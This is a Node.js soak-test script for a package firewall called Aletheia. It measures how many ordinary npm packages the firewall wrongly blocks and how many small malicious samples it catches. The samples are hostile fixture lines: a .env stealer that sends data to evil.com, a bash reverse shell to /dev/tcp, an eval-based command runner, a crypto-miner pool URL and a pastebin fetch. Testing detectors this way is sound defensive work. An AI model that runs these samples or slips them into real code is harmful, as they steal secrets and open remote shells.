#!/usr/bin/env node
/**
 * Aletheia soak test (Windows-safe, no npm spawning).
 * Install the corpus once by hand, then this script only requires each package
 * through the firewall and records the result. It NEVER calls npm.
 *   Setup once:  npm install lodash chalk ms semver debug uuid qs mime nanoid picocolors dayjs commander yargs axios express
 *   Run:         node aletheia-soak-test.js --agent ./packages/fw-agent
 *   Long soak:   node aletheia-soak-test.js --agent ./packages/fw-agent --rounds 100 --interval 300
 */
const { execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const args = process.argv.slice(2);
const getArg = (k, d) => { const i = args.indexOf(k); return i >= 0 ? args[i + 1] : d; };
const AGENT = path.resolve(getArg('--agent', './packages/fw-agent'));
const ROUNDS = parseInt(getArg('--rounds', '1'), 10);
const INTERVAL = parseInt(getArg('--interval', '0'), 10);

const LEGIT = ["lodash","chalk","ms","semver","debug","uuid","qs","mime",
  "nanoid","picocolors","dayjs","commander","yargs","axios","express"];

const MALICIOUS = {
  'miner.js':      "const p='stratum+tcp://xmr.pool.evil:3333'; module.exports={};",
  'stealer.js':    "const fs=require('fs');const s=fs.readFileSync('.env','utf8');require('https').get('http://evil.com?d='+s);",
  'revshell.js':   "require('child_process').exec('bash -i >& /dev/tcp/1.2.3.4/9 0>&1');",
  'evalchain.js':  "const c=eval('req'+'uire');require('child_process').execSync('id');",
  'pasteexfil.js': "require('https').get('https://pastebin.com/raw/xxx');const x='//pastebin';",
};

const ROOT = process.cwd();
const SAMPLES = path.join(ROOT, '.soak-samples');
const RESULTS = path.join(ROOT, 'results');
fs.mkdirSync(SAMPLES, { recursive: true });
fs.mkdirSync(RESULTS, { recursive: true });

function installedPackages() {
  return LEGIT.filter(p => {
    try { require.resolve(p, { paths: [ROOT] }); return true; } catch { return false; }
  });
}

function probe(requireExpr) {
  const env = { ...process.env, FW_ENABLE_DETECTION: '1', FW_ALLOW_DEV_POLICY_KEY: '1' };
  const t0 = process.hrtime.bigint();
  try {
    execFileSync(process.execPath, ['--require', AGENT, '-e', requireExpr],
      { cwd: ROOT, env, stdio: ['ignore', 'pipe', 'pipe'], timeout: 30000 });
    return { blocked: false, rule: null, ms: Number(process.hrtime.bigint() - t0) / 1e6 };
  } catch (e) {
    const out = (e.stdout || '').toString() + (e.stderr || '').toString();
    const m = out.match(/Detection in [^:]+:\s*([A-Za-z_\- ]+)/);
    const blocked = /\[Firewall\]/.test(out);
    return { blocked, rule: m ? m[1].trim() : (blocked ? 'unknown' : null),
             ms: Number(process.hrtime.bigint() - t0) / 1e6, err: !blocked };
  }
}

function runRound(round, corpus) {
  const legitResults = corpus.map(pkg => ({ pkg, ...probe(`require('${pkg}')`) }));
  const malResults = Object.entries(MALICIOUS).map(([name, src]) => {
    const fp = path.join(SAMPLES, name); fs.writeFileSync(fp, src);
    return { name, ...probe(`require(${JSON.stringify(fp)})`) };
  });
  const legitBlocked = legitResults.filter(r => r.blocked);
  const malCaught = malResults.filter(r => r.blocked);
  const summary = {
    ts: new Date().toISOString(), round,
    legit_total: corpus.length, legit_blocked: legitBlocked.length,
    false_positive_rate_pct: corpus.length ? +(legitBlocked.length / corpus.length * 100).toFixed(1) : 0,
    fp_packages: legitBlocked.map(r => `${r.pkg}:${r.rule}`),
    mal_total: malResults.length, mal_caught: malCaught.length,
    true_positive_rate_pct: +(malCaught.length / malResults.length * 100).toFixed(1),
    mal_missed: malResults.filter(r => !r.blocked).map(r => r.name),
    avg_scan_ms: +(legitResults.reduce((s, r) => s + r.ms, 0) / (legitResults.length || 1)).toFixed(1),
  };
  fs.appendFileSync(path.join(RESULTS, `soak-${new Date().toISOString().slice(0,10)}.jsonl`),
    JSON.stringify(summary) + '\n');
  return summary;
}

(async () => {
  console.log(`Aletheia soak test | agent: ${AGENT}`);
  console.log('='.repeat(64));
  const corpus = installedPackages();
  const missing = LEGIT.filter(p => !corpus.includes(p));
  if (missing.length) {
    console.log(`NOTE: ${missing.length} package(s) not installed, skipping: ${missing.join(', ')}`);
    console.log(`      To include them: npm install ${missing.join(' ')}\n`);
  }
  if (!corpus.length) {
    console.log('No corpus packages installed. Run once, then re-run:');
    console.log(`  npm install ${LEGIT.join(' ')}`);
    process.exit(1);
  }
  for (let r = 1; r <= ROUNDS; r++) {
    const s = runRound(r, corpus);
    console.log(`\n[round ${r}/${ROUNDS}] ${s.ts}`);
    console.log(`  FALSE POSITIVES : ${s.legit_blocked}/${s.legit_total} legit blocked  (${s.false_positive_rate_pct}%)  ${s.fp_packages.length ? '-> ' + s.fp_packages.join(', ') : ''}`);
    console.log(`  TRUE POSITIVES  : ${s.mal_caught}/${s.mal_total} malicious caught (${s.true_positive_rate_pct}%)  ${s.mal_missed.length ? 'MISSED: ' + s.mal_missed.join(', ') : ''}`);
    console.log(`  avg scan/pkg    : ${s.avg_scan_ms} ms`);
    if (INTERVAL && r < ROUNDS) await new Promise(res => setTimeout(res, INTERVAL * 1000));
  }
  console.log(`\nResults appended to results/soak-${new Date().toISOString().slice(0,10)}.jsonl`);
})();
